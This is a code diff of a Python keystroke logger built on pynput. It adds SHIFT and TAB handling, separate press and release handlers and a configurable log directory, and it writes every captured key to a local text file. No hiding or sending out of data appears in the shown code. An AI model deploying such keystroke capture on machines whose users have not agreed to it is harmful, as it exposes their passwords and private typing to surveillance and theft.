@@ -1,14 +1,17 @@
 from pynput import keyboard
 
 from input_logger import InputLogger
+from constants import (LOG_DIR, KEYBOARD_LOG_INTERVAL, KEYBOARD_LOG_ON_PRESS, KEYBOARD_LOG_ON_RELEASE)
 
 class KeyboardLogger(InputLogger):
-    def __init__(self, time_interval):
-        super().__init__(time_interval)
+
+
+    def __init__(self):
+        super().__init__(KEYBOARD_LOG_INTERVAL)
         self.log += "=====KeyboardLogger Started====="
 
-    def on_press(self, key):
-        ###
+
+    def parse_key(self, key):
         try:
             keyStr = str(key.char)
         except AttributeError:
@@ -16,14 +19,33 @@ class KeyboardLogger(InputLogger):
                 keyStr = "SPACE"
             elif key == key.esc:
                 keyStr = "ESC"
+            elif key == key.shift:
+                keyStr = "SHIFT"
+            elif key == key.tab:
+                keyStr = "TAB"
             else:
                 keyStr = " " + str(key) + " "
-        ###
+        return keyStr
+
+
+    def on_press(self, key):
+        if KEYBOARD_LOG_ON_PRESS == False:
+            return
+        keyStr = self.parse_key(key)
         log = str(keyStr) + " pressed" + "\n"
         self.add_log(log)
+
+
+    def on_release(self, key):
+        if KEYBOARD_LOG_ON_RELEASE == False:
+            return
+        keyStr = self.parse_key(key)
+        log = str(keyStr) + " released" + "\n"
+        self.add_log(log)
+    
         
     def run(self):
-        self.save_log('keyboard_log.txt')
-        keyboard_listener = keyboard.Listener(on_press=self.on_press)
+        self.save_log(LOG_DIR + 'keyboard_log.txt')
+        keyboard_listener = keyboard.Listener(on_press=self.on_press, on_release = self.on_release)
         with keyboard_listener:
             keyboard_listener.join()
